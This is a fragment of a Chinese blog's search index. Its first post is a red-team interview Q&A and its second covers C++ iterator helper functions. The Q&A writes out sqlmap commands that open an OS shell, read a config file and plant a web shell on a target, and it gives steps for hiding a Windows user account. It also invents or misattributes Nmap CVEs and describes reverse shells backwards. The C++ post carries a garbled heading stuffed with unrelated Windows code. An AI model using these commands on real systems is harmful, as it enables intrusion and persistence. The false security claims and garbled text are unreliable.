class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --os-shell     # 获取操作系统Shell</span><br><span class="line">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --os-pwn       # 获取操作系统级别的访问权限</span><br><span class="line">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --file-read=&quot;/var/www/config.php&quot;  # 读取指定文件内容</span><br><span class="line">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --file-write=&quot;/var/www/shell.php&quot; --file-dest=&quot;/var/www/html/&quot; --tamper=&quot;apostrophemask.py&quot; --batch   # 向目标服务器写入Web Shell</span><br></pre></td></tr></table></figure><h2 id="nmap存在什么漏洞"><a href="#nmap存在什么漏洞" class="headerlink" title="nmap存在什么漏洞"></a>nmap存在什么漏洞</h2><p>Nmap是一种用于网络探测和安全评估的常用工具，不过它本身也存在一些漏洞，以下是一些已公开的Nmap漏洞：</p><ol><li>CVE-2016-3714: ImageMagick命令注入漏洞</li></ol><p>Nmap使用ImageMagick库来处理图像，在旧版本的ImageMagick中存在命令注入漏洞。攻击者可以构造恶意图像文件，通过Nmap执行这些文件的时候触发该漏洞，导致执行任意命令。</p><ol><li>CVE-2017-11615：脚本引擎环境变量注入漏洞</li></ol><p>Nmap支持在其脚本引擎中执行Lua脚本，而在某些情况下，攻击者可以利用环境变量注入漏洞来执行恶意Lua脚本，从而危及系统安全。</p><ol><li>CVE-2018-15173: 路径遍历漏洞</li></ol><p>该漏洞存在于Nmap HTTP服务器中，攻击者可以利用此漏洞通过HTTP服务在目标系统上执行任意命令。</p><p>需要注意的是，这些漏洞大多数已经被修复，并且很少会对最新版本的Nmap构成威胁。建议用户始终使用最新版本的Nmap，并遵循最佳实践，如限制对Nmap的访问权限，避免使用默认帐户和密码，以及定期更新配置文件等。</p><h2 id="nmap常用口令"><a href="#nmap常用口令" class="headerlink" title="nmap常用口令"></a>nmap常用口令</h2><p>Nmap是一种常用的端口扫描和网络发现工具，可以使用各种方式来扫描目标主机和网络，并检测可用的服务和隐蔽的漏洞。以下是一些常用的Nmap口令：</p><ol><li>扫描单个主机：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line"></span><br><span class="line">nmap &lt;target_ip&gt;                 # 扫描指定IP地址</span><br><span class="line">nmap &lt;target_hostname&gt;           # 扫描指定主机名</span><br><span class="line">nmap -p 1-65535 &lt;target&gt;          # 扫描所有端口</span><br><span class="line">nmap -sV &lt;target&gt;                # 扫描目标版本信息</span><br><span class="line">nmap -O &lt;target&gt;                 # 扫描目标操作系统信息</span><br></pre></td></tr></table></figure><ol><li>扫描多个主机：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line"></span><br><span class="line">nmap &lt;subnet&gt;                    # 扫描子网中的所有主机</span><br><span class="line">nmap -iL &lt;targets.txt&gt;           # 扫描包含目标主机列表的文件</span><br><span class="line">nmap -sP &lt;subnet&gt;                # 扫描子网中的所有活动主机（ping扫描）</span><br></pre></td></tr></table></figure><ol><li>扫描特定协议：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line"></span><br><span class="line">nmap -sT &lt;target&gt;                # 使用TCP进行扫描</span><br><span class="line">nmap -sU &lt;target&gt;                # 使用UDP进行扫描</span><br><span class="line">nmap -sS &lt;target&gt;                # 使用SYN进行扫描</span><br><span class="line">nmap -sA &lt;target&gt;                # 使用ACK进行扫描</span><br><span class="line">nmap -sF &lt;target&gt;                # 使用FIN进行扫描</span><br><span class="line">nmap -sX &lt;target&gt;                # 使用XMAS进行扫描</span><br></pre></td></tr></table></figure><ol><li>扫描选项和指令：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line"></span><br><span class="line">nmap -T&lt;level&gt; &lt;target&gt;          # 设置扫描速度（0-5，默认为3）</span><br><span class="line">nmap --top-ports=&lt;number&gt; &lt;target&gt;     # 指定前N个常用端口进行扫描</span><br><span class="line">nmap --script=&lt;name&gt; &lt;target&gt;    # 使用指定的脚本进行扫描</span><br><span class="line">nmap -oA &lt;basename&gt; &lt;target&gt;     # 生成三种格式的输出文件（文本、XML、gnmap）</span><br><span class="line">nmap -v &lt;target&gt;                 # 显示详细信息</span><br></pre></td></tr></table></figure><h2 id="给你一个ip，你如何溯源到真人"><a href="#给你一个ip，你如何溯源到真人" class="headerlink" title="给你一个ip，你如何溯源到真人"></a>给你一个ip，你如何溯源到真人</h2><ol><li>Whois查询：可以通过Whois工具或网站查询IP地址的拥有者和注册信息，包括公司名称、联系人和注册日期等。如果该IP地址属于一个企业或机构，还可以了解其业务性质和所处行业。</li><li>端口扫描：使用端口扫描工具（如Nmap）来探测目标主机上开放的服务和端口，从而推断出其所属行业、用途和技术特征等。</li><li>元数据分析：通过分析目标网站上的元数据，如网页标题、描述和关键字等，以及抓取页面内容和搜索引擎索引等，可以了解网站的业务性质、所处行业和活动范围等。</li><li>社交媒体监测：通过监测目标主机和公司的社交媒体账号，例如微博、LinkedIn和Facebook等，可以获取更多的信息和联系方式，并尝试建立人际关系网络。</li></ol><h2 id="正向shell和反向shell的区别是什么"><a href="#正向shell和反向shell的区别是什么" class="headerlink" title="正向shell和反向shell的区别是什么"></a>正向shell和反向shell的区别是什么</h2><p>正向shell和反向shell都是与远程主机建立命令行连接的工具，可以允许用户执行命令或者进行文件传输等操作。它们的区别在于连接的方向和建立方式：</p><ol><li>正向shell</li></ol><p>正向shell通常是在目标主机上启动一个服务端程序，等待用户连接并进行身份验证后，允许用户在该主机上执行命令。因此，正向shell需要用户能够直接连接到目标主机，并且需要提供一些身份验证方式来保障安全性。</p><ol><li>反向shell</li></ol><p>反向shell则是在攻击者主机上启动一个客户端程序，通过网络连接到目标主机并执行指定的命令或脚本。这种方式通常需要绕过防火墙和其他安全措施，利用漏洞或社会工程学技巧获取目标主机的网络访问权限，因此往往会被视为一种黑客攻击技术。</p><h2 id="连接不了MySQL数据库站点的原因是什么？"><a href="#连接不了MySQL数据库站点的原因是什么？" class="headerlink" title="连接不了MySQL数据库站点的原因是什么？"></a>连接不了MySQL数据库站点的原因是什么？</h2><p>连接不上MySQL数据库站点的原因可能有很多，以下是一些可能的原因：</p><ol><li>数据库服务未启动或已停止：如果MySQL服务器未正确启动或已停止，就无法连接到该服务。</li><li>网络连接问题：如果网络连接不稳定或存在障碍，就可能导致连接失败。例如，防火墙可能会阻止对MySQL端口的访问，或者路由器可能会限制对外部主机的访问。</li><li>认证失败：如果提供的用户名和密码无效，则连接将被拒绝。用户必须确保使用正确的凭据进行身份验证。</li><li>权限问题：如果用户没有足够的权限来连接到MySQL服务器，就可能会出现连接错误。管理员需要检查和修改授权策略以允许合适的用户访问数据库。</li><li>MySQL配置问题：MySQL安装和配置过程中可能存在问题，例如MySQL服务监听错误的网络接口、未正确设置字符集等，这些都可能导致连接失败。</li></ol><p>解决连接不上MySQL数据库站点的问题，需要仔细排除以上可能的原因，并逐步调整相关配置或修复故障。同时，建议用户采取相应的安全措施，如加密通信、限制访问权限和实施备份等来保护数据安全。</p><h2 id="文件上传的检测点有哪些"><a href="#文件上传的检测点有哪些" class="headerlink" title="文件上传的检测点有哪些"></a>文件上传的检测点有哪些</h2><p>文件上传是一种常见的Web攻击方式，攻击者可以通过上传恶意文件来获取目标系统的控制权或执行其他恶意行为。以下是一些可能用到的文件上传检测点：</p><ol><li>文件类型和扩展名：在上传文件时，应该限制允许上传的文件类型和扩展名，并禁止上传可执行文件和脚本等危险文件，例如.exe、.php、.asp等。</li><li>文件大小：应该限制上传文件的大小，以避免恶意用户上传大型文件导致系统资源耗尽，或者上传超过限制大小的文件绕过其他安全措施。</li><li>文件内容检查：对于允许上传的文件，应该进行内容检查，确保其中不包含任何恶意代码、无效数据或其他潜在的安全风险。</li><li>文件重命名：对于上传的文件，应该使用随机的文件名来避免攻击者对其进行识别和攻击。</li><li>路径遍历检查：应该检查上传文件的路径，并防止攻击者利用路径遍历漏洞来上传文件到非预期目录。</li><li>权限和访问控制：应该根据用户身份和角色来控制文件上传的权限和访问控制，防止未经授权的用户上传文件并访问到应用程序中的敏感数据。</li><li>文件处理和存储：应该将上传的文件存储在安全的位置，并对其进行适当的处理和过滤，例如加密、压缩、解压等操作。同时，应该监测并记录所有的文件上传操作，以便后续的审核和追踪。</li></ol><h2 id="常用的外围打点工具有哪些"><a href="#常用的外围打点工具有哪些" class="headerlink" title="常用的外围打点工具有哪些"></a>常用的外围打点工具有哪些</h2><p>外围打点是一种通过对目标系统进行浅层次的探测，获取其基本信息和漏洞情况等方法。以下是一些常用的外围打点工具：</p><ol><li>Nmap：Nmap是一款开源的网络探测工具，可以扫描远程主机和端口，并提供许多高级功能，如操作系统检测、服务版本识别和漏洞扫描等。</li><li>Masscan：Masscan是一款超快的端口扫描器，可以在短时间内对大量目标主机进行快速扫描，并支持TCP和UDP协议。</li><li>Hping：Hping是一款命令行的网络工具，可用于发送自定义数据包和探测目标主机的端口和服务状态。</li><li>Netcat：Netcat是一款多功能的网络工具，可用于创建TCP/UDP连接、传输文件、执行shell命令等。</li><li>Metasploit：Metasploit是一款渗透测试框架，其中包含了许多漏洞利用模块和扫描功能，可用于快速发现目标系统的弱点并进行攻击。</li><li>Nessus：Nessus是一款商业化的漏洞扫描器，可用于检测目标主机和应用程序中的安全漏洞和风险，以及提供修复建议和报告。</li></ol><h2 id="描述一下外围打点的基本流程"><a href="#描述一下外围打点的基本流程" class="headerlink" title="描述一下外围打点的基本流程"></a>描述一下外围打点的基本流程</h2><p>外围打点是一种对目标系统进行浅层次探测的方法，可以帮助安全人员了解目标系统的基本情况和漏洞状况。下面是外围打点的基本流程：</p><ol><li><p>信息收集：在进行外围打点之前，需要先收集相关的信息，包括目标系统的IP地址、域名、开放端口和服务等。可以使用一些工具和技术来收集这些信息，如Whois查询、DNS解析、端口扫描、网络枚举等。</p></li><li><p>网络探测：在收集到目标系统的基本信息后，可以使用网络探测工具进行扫描，以获取更详细的信息和漏洞情况。常用的网络探测工具包括Nmap、Hping、Netcat等，可以进行端口扫描、协议检测、操作系统识别等。</p></li><li><p>漏洞扫描：在探测到目标系统的开放端口和服务后，可以使用漏洞扫描工具来检测其中的安全漏洞和风险。常用的漏洞扫描工具包括Nessus、OpenVAS等，可以通过自动化的方式对目标系统进行安全评估和检测，并生成相应的报告和建议。</p></li><li><p>漏洞利用：在发现目标系统的安全漏洞后，可以使用一些漏洞利用工具进行攻击和渗透测试。常用的漏洞利用工具包括Metasploit、Exploit-db等，可以通过自动化或手动的方式对目标系统进行攻击，并获取相应的权限和访问权。</p></li><li><p>安全评估：最后，需要对外围打点的结果进行分析和总结，评估目标系统的安全性和风险情况，并提出相应的建议和措施来改善安全状况。</p><h2 id="在Windows靶标站点如何建立隐藏用户？"><a href="#在Windows靶标站点如何建立隐藏用户？" class="headerlink" title="在Windows靶标站点如何建立隐藏用户？"></a>在Windows靶标站点如何建立隐藏用户？</h2></li></ol><p>在Windows靶标站点上，可以通过以下步骤建立隐藏用户：</p><ol><li><p>打开计算机管理器：在Windows菜单中搜索“计算机管理器”，或者在“控制面板”中找到“管理工具”并选择“计算机管理器”。</p></li><li><p>创建新用户：在计算机管理器中，展开“本地用户和组”，右键单击“用户”文件夹，并选择“新建用户”。在弹出的对话框中输入用户名和密码等信息，然后单击“创建”。</p></li><li><p>修改注册表：在Windows注册表中添加一个名为“SpecialAccounts”的子项。依次展开“HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts”。如果该子项不存在，则需要手动创建。</p></li><li><p>添加用户：在“SpecialAccounts”下创建一个名为“UserList”的新项，然后右键选择“DWORD值”并将其命名为新创建的用户账户名称。接着将此项的数值设为0，以使该用户不会被列出在登录界面上。</p></li><li><p>保存更改：保存所有修改后，注销当前用户或重新启动计算机，隐藏用户将随之生效。</p><h2 id="文件包含漏洞的原理和防护？"><a href="#文件包含漏洞的原理和防护？" class="headerlink" title="文件包含漏洞的原理和防护？"></a>文件包含漏洞的原理和防护？</h2></li></ol><p>文件包含漏洞（File Inclusion Vulnerability）是一种常见的Web应用程序漏洞，攻击者可以利用该漏洞向服务器传递恶意数据或代码，从而获取敏感信息或控制服务器。其原理主要涉及到以下内容：</p><ol><li>文件包含方式：Web应用程序通常会使用动态脚本语言（如PHP、ASP等）来动态地生成网页内容。其中，文件包含函数（如include、require等）允许将一个文件的内容嵌入到另一个文件中，以实现模块化和重用性。</li><li>用户输入信任：当Web应用程序采用用户输入作为文件路径参数时，如果未对这些参数进行足够的过滤和验证，就可能导致恶意数据或代码被动态地加载到页面中。</li><li>恶意代码注入：攻击者可以通过向文件路径参数中注入恶意代码或文件名来触发文件包含漏洞，并在服务器上执行恶意操作。例如，攻击者可以上传一个包含恶意代码的文件，并将其作为文件路径参数传递给目标服务器，从而执行恶意操作。</li></ol><p>为了防止文件包含漏洞，需要采取一些安全措施，如下所示：</p><ol><li>过滤和验证用户输入：在接收用户输入作为文件路径参数时，必须对其进行过滤和验证，确保其中不包含任何恶意数据或代码。</li><li>使用绝对路径而非相对路径：在使用文件包含函数时，应该使用绝对路径而非相对路径，以避免攻击者通过注入如“../”等文件路径跳出当前目录并访问其他文件。</li><li>限制访问范围：为了防止攻击者利用文件包含漏洞攻击服务器上的敏感文件，可以通过配置文件访问权限和文件夹安全策略等方式来限制访问范围。</li><li>升级和更新软件：Web应用程序中经常会存在许多漏洞和安全风险，因此需要及时升级和更新相关软件和组件，以确保最新的补丁和安全措施已经被采纳。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 护网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 护网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>c++迭代器常用的辅助函数</title>
      <link href="/post/8c139f3f.html"/>
      <url>/post/8c139f3f.html</url>
      
        <content type="html"><![CDATA[<h3 id="xxxxxxxxxx73-1-include-2​3LRESULT-CALLBACK-WndProc-HWND-UINT-WPARAM-LPARAM-4​5int-WINAPI-WinMain-HINSTANCE-hInstance-HINSTANCE-hPrevInstance-PSTR-CmdLine-int-iCmdShow-6-7-static-TCHAR-szAppName-TEXT-“MyWindows”-注意使用TEXT包裹语句8-HWND-hwnd-窗口句柄9-MSG-msg-消息结构10-WNDCLASS-wndclass-窗口类-定义窗口基本属性11-wndclass-style-CS-HREDRAW-CS-VREDRAW-CS-gt-ClassStyle-H-gt-horizontal-水平的-V-gt-vertical-垂直的-redraw-重绘12-wndclass-lpfnWndProc-WndProc-指定窗口过程-回调函数-13-wndclass-cbClsExtra-0-14-wndclass-cbWndExtra-0-预留的额外空间-一般设为015-wndclass-hInstance-hInstance-16-wndclass-hIcon-LoadIcon-NULL-IDI-APPLICATION-设定图标17-wndclass-hCursor-LoadCursor-NULL-IDC-ARROW-设定光标18-wndclass-hbrBackground-HBRUSH-GetStockObject-WHITE-BRUSH-窗口背景色19-wndclass-lpszMenuName-NULL-菜单名字20-wndclass-lpszClassName-szAppName-窗口类名21​22-if-RegisterClass-amp-wndclass-注册窗口-注册成功返回ATOM类型-对应了字符串在ATOM表的位置-注册失败返回023-24-MessageBox-NULL-TEXT-“这个程序需要在Windows-NT才能执行-”-szAppName-MB-ICONERROR-25-26​27-hwnd-CreateWindow-szAppName-28-TEXT-“快乐小凳凳”-29-WS-OVERLAPPEDWINDOW-窗口风格30-CW-USEDEFAULT-31-CW-USEDEFAULT-32-CW-USEDEFAULT-33-CW-USEDEFAULT-34-NULL-35-NULL-36-hInstance-37-NULL38-39​40-ShowWindow-hwnd-iCmdShow-41-UpdateWindow-hwnd-42​43-while-GetMessage-amp-msg-NULL-0-0-44-45-TranslateMessage-amp-msg-46-DispatchMessage-amp-msg-47-48​49-return-msg-wParam-50-51​52LRESULT-CALLBACK-WndProc-HWND-hwnd-UINT-message-WPARAM-wParam-LPARAM-lParam-53-54-HDC-hdc-55-PAINTSTRUCT-ps-56-char-str-TEXT-“大家好-这是我的第一个窗口程序-”-57-RECT-rect-58​59-switch-message-60-61-case-WM-PAINT-62-hdc-BeginPaint-hwnd-amp-ps-63-GetClientRect-hwnd-amp-rect-64-DrawText-hdc-TEXT-“大家好-这是我的第一个窗口程序-”-1-amp-rect-DT-SINGLELINE-DT-CENTER-DT-VCENTER-65-EndPaint-hwnd-amp-ps-66-return-0-67-case-WM-DESTROY-68-PostQuitMessage-0-正式关闭窗口69-return-0-70-71​72-return-DefWindowProc-hwnd-message-wParam-lParam-73-c"><a href="#xxxxxxxxxx73-1-include-2​3LRESULT-CALLBACK-WndProc-HWND-UINT-WPARAM-LPARAM-4​5int-WINAPI-WinMain-HINSTANCE-hInstance-HINSTANCE-hPrevInstance-PSTR-CmdLine-int-iCmdShow-6-7-static-TCHAR-szAppName-TEXT-“MyWindows”-注意使用TEXT包裹语句8-HWND-hwnd-窗口句柄9-MSG-msg-消息结构10-WNDCLASS-wndclass-窗口类-定义窗口基本属性11-wndclass-style-CS-HREDRAW-CS-VREDRAW-CS-gt-ClassStyle-H-gt-horizontal-水平的-V-gt-vertical-垂直的-redraw-重绘12-wndclass-lpfnWndProc-WndProc-指定窗口过程-回调函数-13-wndclass-cbClsExtra-0-14-wndclass-cbWndExtra-0-预留的额外空间-一般设为015-wndclass-hInstance-hInstance-16-wndclass-hIcon-LoadIcon-NULL-IDI-APPLICATION-设定图标17-wndclass-hCursor-LoadCursor-NULL-IDC-ARROW-设定光标18-wndclass-hbrBackground-HBRUSH-GetStockObject-WHITE-BRUSH-窗口背景色19-wndclass-lpszMenuName-NULL-菜单名字20-wndclass-lpszClassName-szAppName-窗口类名21​22-if-RegisterClass-amp-wndclass-注册窗口-注册成功返回ATOM类型-对应了字符串在ATOM表的位置-注册失败返回023-24-MessageBox-NULL-TEXT-“这个程序需要在Windows-NT才能执行-”-szAppName-MB-ICONERROR-25-26​27-hwnd-CreateWindow-szAppName-28-TEXT-“快乐小凳凳”-29-WS-OVERLAPPEDWINDOW-窗口风格30-CW-USEDEFAULT-31-CW-USEDEFAULT-32-CW-USEDEFAULT-33-CW-USEDEFAULT-34-NULL-35-NULL-36-hInstance-37-NULL38-39​40-ShowWindow-hwnd-iCmdShow-41-UpdateWindow-hwnd-42​43-while-GetMessage-amp-msg-NULL-0-0-44-45-TranslateMessage-amp-msg-46-DispatchMessage-amp-msg-47-48​49-return-msg-wParam-50-51​52LRESULT-CALLBACK-WndProc-HWND-hwnd-UINT-message-WPARAM-wParam-LPARAM-lParam-53-54-HDC-hdc-55-PAINTSTRUCT-ps-56-char-str-TEXT-“大家好-这是我的第一个窗口程序-”-57-RECT-rect-58​59-switch-message-60-61-case-WM-PAINT-62-hdc-BeginPaint-hwnd-amp-ps-63-GetClientRect-hwnd-amp-rect-64-DrawText-hdc-TEXT-“大家好-这是我的第一个窗口程序-”-1-amp-rect-DT-SINGLELINE-DT-CENTER-DT-VCENTER-65-EndPaint-hwnd-amp-ps-66-return-0-67-case-WM-DESTROY-68-PostQuitMessage-0-正式关闭窗口69-return-0-70-71​72-return-DefWindowProc-hwnd-message-wParam-lParam-73-c" class="headerlink" title="xxxxxxxxxx73 1#include 2​3LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);4​5int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR CmdLine, int iCmdShow)6{7    static TCHAR szAppName[] = TEXT(“MyWindows”);   // 注意使用TEXT包裹语句8    HWND hwnd;  // 窗口句柄9    MSG msg;    // 消息结构10    WNDCLASS wndclass;  // 窗口类, 定义窗口基本属性11    wndclass.style = CS_HREDRAW | CS_VREDRAW;   // CS-&gt;ClassStyle, H-&gt;horizontal 水平的, V-&gt;vertical 垂直的, redraw 重绘12    wndclass.lpfnWndProc = WndProc;             // 指定窗口过程(回调函数)13    wndclass.cbClsExtra = 0;14    wndclass.cbWndExtra = 0;                    // 预留的额外空间, 一般设为015    wndclass.hInstance = hInstance;16    wndclass.hIcon = LoadIcon(NULL, IDI_APPLICATION);   // 设定图标17    wndclass.hCursor = LoadCursor(NULL, IDC_ARROW);     // 设定光标18    wndclass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);   // 窗口背景色19    wndclass.lpszMenuName = NULL;       // 菜单名字20    wndclass.lpszClassName = szAppName; // 窗口类名21​22    if (!RegisterClass(&amp;wndclass))  // 注册窗口, 注册成功返回ATOM类型(对应了字符串在ATOM表的位置); 注册失败返回023    {24        MessageBox(NULL, TEXT(“这个程序需要在Windows NT才能执行!”), szAppName, MB_ICONERROR);25    }26​27    hwnd = CreateWindow(szAppName,28        TEXT(“快乐小凳凳”),29        WS_OVERLAPPEDWINDOW,    // 窗口风格30        CW_USEDEFAULT,31        CW_USEDEFAULT,32        CW_USEDEFAULT,33        CW_USEDEFAULT,34        NULL,35        NULL,36        hInstance,37        NULL38    );39​40    ShowWindow(hwnd, iCmdShow);41    UpdateWindow(hwnd);42​43    while (GetMessage(&amp;msg, NULL, 0, 0))44    {45        TranslateMessage(&amp;msg);46        DispatchMessage(&amp;msg);47    }48​49    return msg.wParam;50}51​52LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)53{54    HDC hdc;55    PAINTSTRUCT ps;56    char *str = TEXT(“大家好, 这是我的第一个窗口程序!”);57    RECT rect;58​59    switch (message)60    {61    case WM_PAINT:62        hdc = BeginPaint(hwnd, &amp;ps);63        GetClientRect(hwnd, &amp;rect);64        DrawText(hdc, TEXT(“大家好, 这是我的第一个窗口程序!”), -1, &amp;rect, DT_SINGLELINE | DT_CENTER | DT_VCENTER);65        EndPaint(hwnd, &amp;ps);66        return 0;67    case WM_DESTROY:68        PostQuitMessage(0); // 正式关闭窗口69        return 0;70    }71​72    return DefWindowProc(hwnd, message, wParam, lParam);73}c"></a>xxxxxxxxxx73 1#include <windows.h>2​3LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);4​5int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR CmdLine, int iCmdShow)6{7    static TCHAR szAppName[] = TEXT(“MyWindows”);   // 注意使用TEXT包裹语句8    HWND hwnd;  // 窗口句柄9    MSG msg;    // 消息结构10    WNDCLASS wndclass;  // 窗口类, 定义窗口基本属性11    wndclass.style = CS_HREDRAW | CS_VREDRAW;   // CS-&gt;ClassStyle, H-&gt;horizontal 水平的, V-&gt;vertical 垂直的, redraw 重绘12    wndclass.lpfnWndProc = WndProc;             // 指定窗口过程(回调函数)13    wndclass.cbClsExtra = 0;14    wndclass.cbWndExtra = 0;                    // 预留的额外空间, 一般设为015    wndclass.hInstance = hInstance;16    wndclass.hIcon = LoadIcon(NULL, IDI_APPLICATION);   // 设定图标17    wndclass.hCursor = LoadCursor(NULL, IDC_ARROW);     // 设定光标18    wndclass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);   // 窗口背景色19    wndclass.lpszMenuName = NULL;       // 菜单名字20    wndclass.lpszClassName = szAppName; // 窗口类名21​22    if (!RegisterClass(&amp;wndclass))  // 注册窗口, 注册成功返回ATOM类型(对应了字符串在ATOM表的位置); 注册失败返回023    {24        MessageBox(NULL, TEXT(“这个程序需要在Windows NT才能执行!”), szAppName, MB_ICONERROR);25    }26​27    hwnd = CreateWindow(szAppName,28        TEXT(“快乐小凳凳”),29        WS_OVERLAPPEDWINDOW,    // 窗口风格30        CW_USEDEFAULT,31        CW_USEDEFAULT,32        CW_USEDEFAULT,33        CW_USEDEFAULT,34        NULL,35        NULL,36        hInstance,37        NULL38    );39​40    ShowWindow(hwnd, iCmdShow);41    UpdateWindow(hwnd);42​43    while (GetMessage(&amp;msg, NULL, 0, 0))44    {45        TranslateMessage(&amp;msg);46        DispatchMessage(&amp;msg);47    }48​49    return msg.wParam;50}51​52LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)53{54    HDC hdc;55    PAINTSTRUCT ps;56    char *str = TEXT(“大家好, 这是我的第一个窗口程序!”);57    RECT rect;58​59    switch (message)60    {61    case WM_PAINT:62        hdc = BeginPaint(hwnd, &amp;ps);63        GetClientRect(hwnd, &amp;rect);64        DrawText(hdc, TEXT(“大家好, 这是我的第一个窗口程序!”), -1, &amp;rect, DT_SINGLELINE | DT_CENTER | DT_VCENTER);65        EndPaint(hwnd, &amp;ps);66        return 0;67    case WM_DESTROY:68        PostQuitMessage(0); // 正式关闭窗口69        return 0;70    }71​72    return DefWindowProc(hwnd, message, wParam, lParam);73}c</h3><p>STL 中有用于操作迭代器的三个函数模板，它们是：</p><ul><li><p>advance(p, n)：使迭代器 p 向前或向后移动 n 个元素</p></li><li><p>distance(p, q)：计算两个迭代器之间的距离，即迭代器 p 经过多少次 + + 操作后和迭代器 q 相等。如果调用时 p 已经指向 q 的后面，则这个函数会陷入死循环</p></li><li><p>iter_swap(p, q)：交换容器中两个迭代器指向的位置的值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">5</span>] = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> &#125;;</span><br><span class="line">    list &lt;<span class="type">int</span>&gt; <span class="built_in">lst</span>(a, a + <span class="number">5</span>);</span><br><span class="line">    list &lt;<span class="type">int</span>&gt;::iterator p = lst.<span class="built_in">begin</span>();</span><br><span class="line">    <span class="built_in">advance</span>(p, <span class="number">2</span>);  <span class="comment">//p向后移动两个元素，指向3</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;1)&quot;</span> &lt;&lt; *p &lt;&lt; endl;  <span class="comment">//输出 1)3</span></span><br><span class="line">    <span class="built_in">advance</span>(p, <span class="number">-1</span>);  <span class="comment">//p向前移动一个元素，指向2</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;2)&quot;</span> &lt;&lt; *p &lt;&lt; endl;  <span class="comment">//输出 2)2</span></span><br><span class="line">    list&lt;<span class="type">int</span>&gt;::iterator q = lst.<span class="built_in">end</span>();  <span class="comment">// end指向的是最后一个元素的下一个位置</span></span><br><span class="line">    q--;  <span class="comment">// q 指向 5</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;3)&quot;</span> &lt;&lt; <span class="built_in">distance</span>(p, q) &lt;&lt; endl;  <span class="comment">//输出 3)3</span></span><br><span class="line">    <span class="built_in">iter_swap</span>(p, q); <span class="comment">// 交换容器中两个位置的值</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;4)&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (p = lst.<span class="built_in">begin</span>(); p != lst.<span class="built_in">end</span>(); ++p)</span><br><span class="line">        cout &lt;&lt; *p &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2023/05/12/p9yhLTg.png" alt=""></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
          <category> 实用函数 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++迭代器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++字符串分割的常用方法</title>
      <link href="/post/54c3fa40.html"/>
      <url>/post/54c3fa40.html</url>
      
